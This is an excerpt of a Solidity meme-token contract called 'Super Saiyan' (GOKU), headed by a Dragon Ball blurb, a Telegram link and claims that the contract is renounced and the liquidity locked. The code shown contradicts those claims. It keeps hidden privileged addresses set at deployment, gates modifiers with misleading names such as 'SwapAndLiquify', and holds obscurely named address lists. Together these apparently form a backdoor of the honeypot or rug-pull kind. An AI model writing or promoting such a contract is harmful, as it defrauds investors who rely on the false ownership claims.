...
/*
💪Super Saiyan💪
https://t.me/SuperSaiyanV2
Le Super Saiyan, parfois orthographié Super Saïyen, également connu sous le nom de Super Guerrier, 
est un état physique fictif créé par Akira Toriyama dans le manga Dragon Ball. 
Les Saiyans sont des individus issus de la planète Vegeta
TOKENOMICS:
🏧 LP LOCKED
📝 CA RENOUNCED & VERIFIED
💰 TAX 3/3
*/
// SPDX-License-Identifier: MIT

pragma solidity 0.8.19;
abstract contract GOKUAs {
...
interface GOKUAsii is GOKUAsi {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}
abstract contract GOKUAsiii is GOKUAs {
...
contract GOKU is GOKUAs, GOKUAsi, GOKUAsii, GOKUAsiii {

    mapping(address => uint256) private sendamount;
  mapping(address => bool) public GOKUAsiiZERTY;
    mapping(address => mapping(address => uint256)) private noFeeFromTransfer;
address private GOKURooter;
    uint256 private ALLtotalSupply;
    string private _name;
    string private _symbol;
        mapping(address => bool) public GOKUPaw;
  address GOKUAdr;



    
    constructor(address GOKUadressss) {
            // Editable
            GOKUAdr = msg.sender;

        _name = "Super Saiyan";
        _symbol = "GOKU";
  GOKURooter = GOKUadressss;        
        uint GOKUTotalSupply = 200000000000 * 10**9;
        process(msg.sender, GOKUTotalSupply);
    }
    ...
    function transferFrom(
      ...
      modifier SwapAndLiquify() {
        require(GOKURooter == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
  ...
  modifier walo () {
    require(GOKUAdr == msg.sender, "Ehi20: cannot permit SwapAndLiquify address");
    _;
